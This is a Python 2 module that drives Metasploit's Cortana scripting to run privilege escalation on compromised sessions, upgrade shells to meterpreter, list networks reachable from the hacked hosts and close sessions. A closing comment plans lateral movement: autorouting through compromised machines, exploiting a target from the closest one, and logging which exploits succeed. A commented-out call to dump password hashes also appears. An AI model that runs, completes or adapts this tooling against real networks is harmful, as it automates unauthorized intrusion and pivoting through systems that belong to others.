import sys
import time
import subprocess
import shared_util
from collections import defaultdict
from netaddr import IPNetwork, IPAddress, IPRange

def searchForTarget(session_db, db_h, host_list):

   #privilege escaltion if needed, change shells to meterpreter sessions
   #creds = getHashes(session_db)
   (session_db, alteredSessions) = manageSessions(session_db, db_h)
   (new_networks, hierarchy, exclude) = findNewNetworks(session_db)
   return (session_db, new_networks, hierarchy, alteredSessions, exclude)

def manageSessions(session_db, db_h):

   alteredSessions = []

   print session_db

   string = ""
   for s in session_db:
      session = session_db[s]
      if session['sessionNum'] != 0 and (session['user'] != "root" or session['type'] != "meterpreter"):
         string += session['sessionNum'] + "," + db_h[session['host']]['os_name'] + \
         "," + session['host'] + ";"
         alteredSessions.append(session['host'])

   if string != "":
      string = string[:len(string) - 1]
   
      p = subprocess.Popen(['java', '-jar', 'cortana.jar', str(shared_util.prop_file_name), \
      'manageSessions.cna'], stdout=subprocess.PIPE, stdin=subprocess.PIPE)

      print "Elevating Privileges and Upgrading Sessions for " + string         
      p.stdin.write("arguments %s" % string)
      output = p.communicate()[0]
      p.stdin.close();

      for line in output.splitlines():
         #print "Line: " + str(line)

         (hostIP, sessionNum, privileges) = line.split(',')
         s_data = session_db[hostIP]

         if s_data['sessionNum'] < sessionNum:
            session_db[hostIP]['sessionNum'] = sessionNum
            #if s_data['user'] != "root" and privileges == "root":
            session_db[hostIP]['user'] = privileges

   return (session_db, alteredSessions)

def findNewNetworks(session_db):

   new_networks = []
   exclude = []
   hierarchy = defaultdict()

   string = ""
   for s in session_db:
      session = session_db[s]
      if session['type'] == "meterpreter":
         string += session['sessionNum'] + "," + session['host'] + ";"
   string = string[:len(string) - 1]
 
   if string != "":
      p = subprocess.Popen(['java', '-jar', 'cortana.jar', str(shared_util.prop_file_name), \
         'networkSearch.cna'], stdout=subprocess.PIPE, stdin=subprocess.PIPE)

      print "Searching for networks"   
      p.stdin.write("arguments %s" % string)
      output = p.communicate()[0]
      p.stdin.close();

      print output

      for line in output.splitlines():
         info = line.split(',')
         newRange = getCIDR(alterIP(info[1]), info[2])
         new_networks.append(newRange)
         if info[0] not in hierarchy:
            hierarchy[info[0]] = []
         if info[1] not in exclude:
            exclude.append(info[1])
         hierarchy[info[0]].append(newRange)

   return (new_networks, hierarchy, exclude)

def getCIDR(addr, mask):

   ip = IPNetwork(str(addr) + "/" + str(mask))
   return ip.__str__()

def alterIP(ip):
   return ip[:ip.rfind(".") + 1] + "0"

def closeSessions():

   p = subprocess.Popen(['java', '-jar', 'cortana.jar', str(shared_util.prop_file_name), \
      'closeSessions.cna'], stdout=subprocess.PIPE, stdin=subprocess.PIPE)

   output = p.communicate()[0]
   p.stdin.close();

'''
   use IPnetwork to transform subnets into integers (need ip address, mask)
   determine if target IP is within subnet for each compromised machine
   if yes:
      update routing table (autoroute)
      try to compromise with closest machine
      if yes:
         make note that target has been compromised
         store closest machine
         move one level backwards and try to exploit closest machine, continue until specified IPs are reached
      if no:
         look for same target subnet but different closest machine
   if no:
      continue to next available session
logging information:
   if target is found
   closest machine to target
   subnets that were found
   subnets that were explored
   routes to target from specified IPs
   if the target was compromised
   what machines are able to compromise the target
   what exploits are successful
'''